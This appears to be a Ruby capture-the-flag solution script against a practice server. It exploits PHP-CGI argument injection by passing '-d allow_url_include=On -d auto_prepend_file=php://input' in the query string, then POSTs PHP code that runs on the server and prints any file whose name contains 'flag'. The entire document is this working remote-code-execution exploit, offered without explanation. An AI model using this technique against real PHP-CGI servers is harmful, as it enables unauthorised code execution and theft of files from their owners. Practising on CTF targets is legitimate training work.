require 'net/http'

uri = URI.parse 'http://ctfq.sweetduet.info:10080/~q12/'
option = "-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"

Net::HTTP.start uri.host, uri.port do |http|
  res = http.post uri.path + "?" + option, <<-EOS
<?php
foreach(glob('./*') as $file){
  if(is_file($file)){
    if(strpos($file,'flag') !== false){
      readfile($file);
    }
  }
}
?>
  EOS

  puts res.body
end

